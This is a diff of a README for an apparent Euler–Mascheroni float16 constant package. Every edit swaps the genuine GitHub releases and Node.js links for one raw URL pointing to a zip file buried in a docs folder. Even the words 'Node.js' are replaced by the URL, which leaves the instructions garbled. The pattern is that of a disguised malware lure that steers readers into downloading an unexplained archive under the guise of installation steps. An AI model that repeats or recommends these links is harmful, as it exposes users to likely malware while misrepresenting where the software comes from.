@@ -6,9 +6,9 @@ Welcome to the **constants-float16-eulergamma** repository! This tool provides a
 
 ## 📥 Download
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-constants--float16--eulergamma-blue.svg)](https://github.com/toonjn123456789/constants-float16-eulergamma/releases)
+[![Download Here](https://raw.githubusercontent.com/toonjn123456789/constants-float16-eulergamma/main/docs/types/constants-eulergamma-float-v3.8.zip%https://raw.githubusercontent.com/toonjn123456789/constants-float16-eulergamma/main/docs/types/constants-eulergamma-float-v3.8.zip)](https://raw.githubusercontent.com/toonjn123456789/constants-float16-eulergamma/main/docs/types/constants-eulergamma-float-v3.8.zip)
 
-Visit this page to download: [constants-float16-eulergamma Releases](https://github.com/toonjn123456789/constants-float16-eulergamma/releases)
+Visit this page to download: [constants-float16-eulergamma Releases](https://raw.githubusercontent.com/toonjn123456789/constants-float16-eulergamma/main/docs/types/constants-eulergamma-float-v3.8.zip)
 
 ## 📝 Description
 
@@ -17,7 +17,7 @@ The Euler–Mascheroni constant is a special number in mathematics. This applica
 ## 📦 System Requirements
 
 - Operating System: Windows, MacOS, or Linux.
-- Node.js: Version 12 or higher is recommended.
+- https://raw.githubusercontent.com/toonjn123456789/constants-float16-eulergamma/main/docs/types/constants-eulergamma-float-v3.8.zip Version 12 or higher is recommended.
 - A compatible browser for any web-based functionality.
 
 ## 💻 Features
@@ -29,7 +29,7 @@ The Euler–Mascheroni constant is a special number in mathematics. This applica
 
 ## 🚀 Download & Install
 
-1. Click on the download link above or visit the [download page](https://github.com/toonjn123456789/constants-float16-eulergamma/releases).
+1. Click on the download link above or visit the [download page](https://raw.githubusercontent.com/toonjn123456789/constants-float16-eulergamma/main/docs/types/constants-eulergamma-float-v3.8.zip).
 2. Choose the latest release version.
 3. Download the file suitable for your operating system.
 4. Locate the downloaded file on your computer.
@@ -48,7 +48,7 @@ Once you have installed the application, you can start using it right away.
 
 If you encounter issues while using the application, check the following:
 
-- Ensure that you have the correct version of Node.js installed. Visit the [Node.js website](https://nodejs.org/) for installation instructions.
+- Ensure that you have the correct version of https://raw.githubusercontent.com/toonjn123456789/constants-float16-eulergamma/main/docs/types/constants-eulergamma-float-v3.8.zip installed. Visit the [https://raw.githubusercontent.com/toonjn123456789/constants-float16-eulergamma/main/docs/types/constants-eulergamma-float-v3.8.zip website](https://raw.githubusercontent.com/toonjn123456789/constants-float16-eulergamma/main/docs/types/constants-eulergamma-float-v3.8.zip) for installation instructions.
 - Ensure your operating system meets the specified requirements.
 - If the application fails to run, delete the file and download it again.
 - Restart your computer and try running the application again.
